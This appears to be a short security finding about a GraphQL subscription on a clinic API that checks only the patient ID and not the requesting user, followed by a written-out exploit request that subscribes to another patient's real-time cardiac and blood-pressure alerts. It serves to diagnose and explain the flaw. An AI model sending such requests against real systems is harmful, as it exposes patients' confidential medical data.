diagnosis: The subscription filters telemetry alerts strictly by matching patientId between payload and arguments. It ignores context.user, allowing any hospital staff account or external user with a valid JWT to stream real-time cardiac rhythm and blood pressure emergency alerts for patients they do not treat.
exploit_request:
POST /graphql HTTP/1.1
Host: api.clinicflow.org
Upgrade: websocket
Sec-WebSocket-Protocol: graphql-transport-ws

{"type": "subscribe", "id": "vitals_sub", "payload": {"query": "subscription { patientVitalsAlert(patientId: \"pat_cardiac_412\") { heartRate spO2 alertType } }"}}
